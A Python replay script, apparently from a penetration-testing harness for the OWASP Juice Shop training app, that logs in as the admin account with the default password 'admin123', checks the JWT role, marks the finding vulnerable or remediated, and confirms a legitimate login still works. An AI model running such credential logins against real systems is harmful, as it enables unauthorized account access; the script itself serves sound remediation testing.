#!/usr/bin/env python3
"""pt07: the real admin account accepts a weak, default password.

Unlike pt02 (SQL injection bypass) or pt06 (forged token), this is a
genuine login with the real account's own actual password. No
injection, no forgery, just admin@juice-sh.op / admin123. Confirmed
directly: Juice Shop's own scoreboard flips 'Password Strength' to
solved on the very first attempt, no narrower intended-solve path this
time (unlike pt04's and pt06's scoreboard checks).

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt07-001.json"


def _jwt_payload(token: str) -> dict:
    try:
        payload_b64 = token.split(".")[1]
        padded = payload_b64 + "=" * (-len(payload_b64) % 4)
        return json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return {}


def _login(target: str, email: str, password: str) -> tuple[int, dict]:
    req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    creds = blueprint["attack_credentials"]

    exploit_status, exploit_body = _login(target, creds["email"], creds["password"])
    token = exploit_body.get("authentication", {}).get("token", "")
    role = _jwt_payload(token).get("data", {}).get("role")

    if exploit_status in (400, 401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and role == "admin":
        status = "VULNERABLE"
        summary = f"Logged in as the real admin account with the weak default password '{creds['password']}'."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, role={role!r}."

    stamp = str(int(time.time() * 1000))
    legit_email = f"pt07-{stamp}@flatline.test"
    legit_password = "NotOnAnyBlocklist987!"
    register_req = urllib.request.Request(
        f"{target}/api/Users",
        data=json.dumps({"email": legit_email, "password": legit_password, "passwordRepeat": legit_password}).encode(),
        method="POST",
    )
    register_req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(register_req, timeout=10).read()
    legit_status, legit_body = _login(target, legit_email, legit_password)
    legitimate_login_ok = legit_status == 200 and legit_body.get("authentication", {}).get("umail") == legit_email

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_login_ok": legitimate_login_ok,
        "legitimate_login_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt07-weak-default-credentials", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
